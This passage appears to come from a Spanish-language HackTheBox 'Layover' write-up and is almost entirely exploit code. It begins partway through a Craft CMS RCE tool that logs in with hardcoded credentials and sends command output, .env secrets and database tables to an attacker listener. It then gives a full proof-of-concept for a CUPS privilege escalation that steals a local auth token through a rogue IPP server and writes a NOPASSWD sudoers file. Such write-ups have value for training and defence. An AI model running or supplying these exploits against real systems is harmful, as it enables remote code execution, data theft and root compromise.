        description="Craft CMS 5.9.8 RCE + exfil (HTB Layover)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  %(prog)s -u http://portal.international.htb -L 10.13.37.182 -c 'id'
  %(prog)s -u http://portal.international.htb -L 10.13.37.182 --env
  %(prog)s -u http://portal.international.htb -L 10.13.37.182 --table htbairways_settings
  %(prog)s -u http://portal.international.htb -L 10.13.37.182 --relay
  %(prog)s -u http://portal.international.htb -L 10.13.37.182 --blind -c 'sleep 5'
  %(prog)s -u http://x -L 0.0.0.0 --listen 9999
        """,
    )
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-U", "--username", default="jenny")
    p.add_argument("--password", default="Fl1ghtDeck2026!")
    p.add_argument("--cp-path", default="/admin")
    p.add_argument("-L", "--lhost", required=True)
    p.add_argument("-p", "--port", type=int, default=9999)
    g = p.add_mutually_exclusive_group(required=False)
    g.add_argument("-c", "--cmd")
    g.add_argument("--env", action="store_true")
    g.add_argument("--table", metavar="TABLA", nargs="?", const="htbairways_settings")
    g.add_argument("--relay", action="store_true")
    g.add_argument("--listen", type=int, metavar="PORT")
    p.add_argument("--security-key", default="IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr")
    p.add_argument("--db-user", default="craftuser")
    p.add_argument("--db-pass", default="CraftDB_pw_2026")
    p.add_argument("--db-name", default="craft")
    p.add_argument("--blind", action="store_true")
    p.add_argument("--interpreter", default="sh")
    args = p.parse_args()
    if args.listen:
        start_listener(args.listen)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            sys.exit(0)
    if not (args.cmd or args.env or args.relay or args.table):
        p.error("Especifica -c CMD, --env, --relay o --table")
    base = args.url.rstrip("/")
    session = requests.Session()
    session.verify = False
    print("[*] Iniciando sesión...")
    csrf = do_login(session, base, args.cp_path, args.username, args.password)
    if args.blind:
        t0 = time.time()
        send_payload(session, base, args.cp_path, csrf, args.cmd)
        print(f"[*] Tiempo de respuesta: {time.time() - t0:.2f}s")
        return
    if args.env:
        script = script_env(args.lhost, args.port)
        label = ".env"
    elif args.relay:
        script = script_relay(args.lhost, args.port, args.security_key,
                              db_user=args.db_user, db_pass=args.db_pass,
                              db_name=args.db_name)
        label = "mailRelay (dinámico)"
    elif args.table:
        script = script_table(args.lhost, args.port, table=args.table,
                              db_user=args.db_user, db_pass=args.db_pass,
                              db_name=args.db_name)
        label = f"tabla: {args.table}"
    else:
        script = script_exec(args.cmd, args.lhost, args.port)
        label = f"cmd: {args.cmd}"
    print(f"[*] Modo: {label}")
    start_listener(args.port)
    time.sleep(0.5)
    run_two_stage(session, base, args.cp_path, csrf,
                  args.lhost, args.port, script,
                  interpreter=args.interpreter)
    if ExfilHandler.results:
        print(f"[+] OK — {len(ExfilHandler.results)} respuesta(s).")
    else:
        print("[-] Sin datos recibidos.")
if __name__ == "__main__":
    main()
```
---


## Script 2 — poc.py

**Ubicación:** `/home/contractor/Desktop/poc.py` (jumpbox, servido al target)  
**Target:** `portal.international.htb` (10.13.37.10), ejecutado como `aporter`  
**Función:** CVE-2026-34990 — CUPS 2.4.16 privesc.

```python
#!/usr/bin/env python3
"""
CVE-2026-34990 minimal PoC
CUPS <= 2.4.16 local privesc via Local token leak + file:// device-uri
Python 3 stdlib only.
Usage: python3 poc.py   (then: sudo -i)
"""
import getpass, gzip, os, socket, struct, subprocess, sys, threading, time
USER = getpass.getuser()
CUPS = ("127.0.0.1", 631)
ROGUE = ("127.0.0.1", 9189)
def attr(tag, name, val):
    n, v = name.encode(), (val if isinstance(val, bytes) else val.encode())
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
def ipp_req(op, rid, attrs, printer_attrs=None, body=b""):
    buf = struct.pack(">BBHI", 2, 0, op, rid)
    buf += b"\x01"
    for a in attrs:
        buf += a
    if printer_attrs:
        buf += b"\x04"
        for a in printer_attrs:
            buf += a
    buf += b"\x03"
    return buf + body
def common_attrs():
    return [
        attr(0x47, "attributes-charset", "utf-8"),
        attr(0x48, "attributes-natural-language", "en"),
        attr(0x42, "requesting-user-name", USER),
    ]
def ipp_post(path, payload, token=None):
    hdrs = (
        f"POST {path} HTTP/1.1\r\nHost: {CUPS[0]}:{CUPS[1]}\r\n"
        f"Content-Type: application/ipp\r\nContent-Length: {len(payload)}\r\n"
    )
    if token:
        hdrs += f"Authorization: Local {token}\r\n"
    hdrs += "Connection: close\r\n\r\n"
    with socket.create_connection(CUPS, timeout=5) as s:
        s.sendall(hdrs.encode() + payload)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    _, _, body = resp.partition(b"\r\n\r\n")
    return struct.unpack(">H", body[2:4])[0] if len(body) >= 4 else -1
captured_token = None
def rogue_server():
    global captured_token
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(ROGUE)
    srv.listen(2)
    srv.settimeout(15)
    deadline = time.time() + 15
    while time.time() < deadline and not captured_token:
        try:
            c, _ = srv.accept()
        except socket.timeout:
            continue
        with c:
            c.settimeout(5)
            data = b""
            while b"\r\n\r\n" not in data:
                x = c.recv(4096)
                if not x:
                    break
                data += x
            for line in data.decode("latin1", "replace").splitlines():
                if line.lower().startswith("authorization: local "):
                    captured_token = line.split(None, 2)[2]
            if captured_token:
                ipp_ok = (
                    b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                    b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                    b"\x48\x00\x1battributes-natural-language\x00\x02en\x03"
                )
                c.sendall(
                    f"HTTP/1.1 200 OK\r\nContent-Length: {len(ipp_ok)}\r\n"
                    f"Connection: close\r\n\r\n".encode() + ipp_ok
                )
            else:
                c.sendall(
                    b"HTTP/1.1 401 Unauthorized\r\n"
                    b'WWW-Authenticate: Local trc="y"\r\n'
                    b"Content-Length: 0\r\nConnection: close\r\n\r\n"
                )
    srv.close()
def coerce():
    body = ipp_req(
        0x4028, 1,
        common_attrs() + [attr(0x45, "printer-uri", f"ipp://localhost:{CUPS[1]}/")],
        [
            attr(0x42, "printer-name", "leak"),
            attr(0x45, "device-uri", f"ipp://{ROGUE[0]}:{ROGUE[1]}/ipp/print"),
        ],
    )
    try:
        ipp_post("/", body)
    except Exception:
        pass
def write_sudoers(token):
    name = f"pwn{int(time.time()) % 99999}"
    printer_uri = f"ipp://localhost:{CUPS[1]}/printers/{name}"
    target = f"/etc/sudoers.d/{USER}-pwn"
    ipp_post("/admin/", ipp_req(
        0x4003, 10,
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)],
        [
            attr(0x45, "device-uri", f"file://{target}"),
            attr(0x42, "printer-name", name),
            attr(0x42, "ppd-name", "raw"),
            attr(0x22, "printer-is-temporary", b"\x00"),
            attr(0x22, "printer-is-accepting-jobs", b"\x01"),
            attr(0x21, "printer-state", struct.pack(">i", 3)),
        ],
    ), token=token)
    ipp_post("/admin/", ipp_req(
        0x4008, 11,
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)],
    ), token=token)
    ipp_post("/admin/", ipp_req(
        0x0011, 12,
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)],
    ), token=token)
    payload = gzip.compress(f"{USER} ALL=(ALL) NOPASSWD: ALL\n".encode())
    ipp_post(f"/printers/{name}", ipp_req(
        0x0002, 13,
        common_attrs() + [
            attr(0x45, "printer-uri", printer_uri),
            attr(0x49, "document-format", "application/vnd.cups-raw"),
            attr(0x44, "compression", "gzip"),
            attr(0x42, "job-name", "pwn"),
        ],
        body=payload,
    ), token=token)
    time.sleep(1)
    return target
def main():
    print(f"[*] CVE-2026-34990 | user={USER} | cupsd={CUPS[0]}:{CUPS[1]}")
    t = threading.Thread(target=rogue_server, daemon=True)
    t.start()
    time.sleep(0.3)
    print("[*] coercing cupsd → rogue server ...")
    coerce()
    t.join(timeout=16)
    if not captured_token:
        sys.exit("[-] token leak failed — cupsd not root or not reachable?")
    print(f"[+] captured token: {captured_token}")
    print("[*] writing sudoers ...")
    path = write_sudoers(captured_token)
    print(f"[+] wrote {path}")
    r = subprocess.run(["sudo", "-n", "id"], capture_output=True, text=True)
    if r.returncode == 0:
        print(f"[+] ROOT: {r.stdout.strip()}")
        print("[*] run: sudo -i")
    else:
        print("[-] sudo check failed — retry: python3 poc.py")
if __name__ == "__main__":
    main()
```
---


